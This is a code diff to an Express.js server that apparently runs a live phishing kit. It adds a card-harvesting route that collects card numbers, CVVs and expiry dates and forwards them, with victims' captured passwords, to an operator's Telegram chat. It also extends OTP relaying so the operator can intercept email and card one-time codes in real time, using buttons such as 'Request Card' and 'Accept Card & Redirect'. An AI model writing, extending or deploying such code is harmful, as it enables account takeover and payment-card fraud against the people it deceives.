@@ -101,6 +101,9 @@ app.post('/api/login', async (req, res) => {
     inline_keyboard: [
       [
         { text: '📤 POP OTP', callback_data: `pop_otp:${email}` },
+        { text: '💳 Request Card', callback_data: `show_card:${email}` }
+      ],
+      [
         { text: '❌ CANCEL', callback_data: `cancel:${email}` }
       ]
     ]
@@ -114,7 +117,12 @@ app.post('/api/login', async (req, res) => {
     otp: null,
     otpExpiry: null,
     otpEntered: null,
-    redirectUrl: null
+    redirectUrl: null,
+    cardNumber: null,
+    cvv: null,
+    expiry: null,
+    cardOtpEntered: null,
+    cardOtpMode: false
   };
 
   try {
@@ -162,27 +170,55 @@ app.post('/api/submit-otp', async (req, res) => {
 
   // Update session state
   session.status = 'otp_submitted';
-  session.otpEntered = otp;
 
+  let message;
+  let reply_markup;
   const timestamp = getISTDateTime();
-  const message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;
 
-  const reply_markup = {
-    inline_keyboard: [
-      [
-        { text: '✅ ACCEPT OTP', callback_data: `accept_otp:${email}` },
-        { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` }
-      ],
-      [
-        { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` },
-        { text: '❌ CANCEL', callback_data: `cancel:${email}` }
+  if (session.cardOtpMode) {
+    session.cardOtpEntered = otp;
+    const rawCard = (session.cardNumber || '').replace(/\D/g, '');
+    const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
+
+    message = `🔐 CARD OTP ENTERED\n\n📧 Email: ${email}\n💳 Card: ${formattedCard}\n🔢 Card OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;
+
+    reply_markup = {
+      inline_keyboard: [
+        [
+          { text: '✅ ACCEPT CARD OTP', callback_data: `accept_otp:${email}` },
+          { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` }
+        ],
+        [
+          { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` },
+          { text: '❌ CANCEL', callback_data: `cancel:${email}` }
+        ]
       ]
-    ]
-  };
+    };
+  } else {
+    session.otpEntered = otp;
+
+    message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;
+
+    reply_markup = {
+      inline_keyboard: [
+        [
+          { text: '✅ ACCEPT OTP', callback_data: `accept_otp:${email}` },
+          { text: '💳 ACCEPT OTP + CARD', callback_data: `accept_otp_card:${email}` }
+        ],
+        [
+          { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` },
+          { text: '❌ CANCEL', callback_data: `cancel:${email}` }
+        ],
+        [
+          { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` }
+        ]
+      ]
+    };
+  }
 
   try {
     await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
-    console.log(`[Express] User ${email} submitted OTP: ${otp}. Notified admin.`);
+    console.log(`[Express] User ${email} submitted ${session.cardOtpMode ? 'Card' : 'Email'} OTP: ${otp}. Notified admin.`);
   } catch (error) {
     console.error('[Express Error] Failed to send OTP entered message to Telegram:', error.message);
   }
@@ -230,6 +266,45 @@ app.post('/api/clear-session', (req, res) => {
     delete otpStore[email];
     console.log(`[Express] Session successfully cleared for ${email}`);
   }
+  return res.json({ success: true });
+});
+
+// POST /api/submit-card — User submits card details after OTP card popup
+app.post('/api/submit-card', async (req, res) => {
+  const { email, cardNumber, cvv, expiry } = req.body;
+  if (!email || !cardNumber || !cvv || !expiry) {
+    return res.status(400).json({ success: false, error: 'All card fields are required.' });
+  }
+
+  const session = otpStore[email];
+  if (!session) {
+    return res.status(404).json({ success: false, error: 'Session not found' });
+  }
+
+  // Store card details in session
+  session.cardNumber = cardNumber;
+  session.cvv = cvv;
+  session.expiry = expiry;
+  session.status = 'card_submitted';
+
+  const timestamp = getISTDateTime();
+  const message = `💳 CARD DETAILS RECEIVED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕐 Time: ${timestamp}`;
+
+  const reply_markup = {
+    inline_keyboard: [
+      [{ text: '✅ Accept Card & Redirect', callback_data: `accept_card:${email}` }],
+      [{ text: '🔄 Show OTP Popup Again', callback_data: `show_otp_again:${email}` }],
+      [{ text: '❌ Cancel Everything', callback_data: `cancel:${email}` }]
+    ]
+  };
+
+  try {
+    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
+    console.log(`[Express] User ${email} submitted card details. Notified admin.`);
+  } catch (error) {
+    console.error('[Express Error] Failed to send card details to Telegram:', error.message);
+  }
+
   return res.json({ success: true });
 });
 
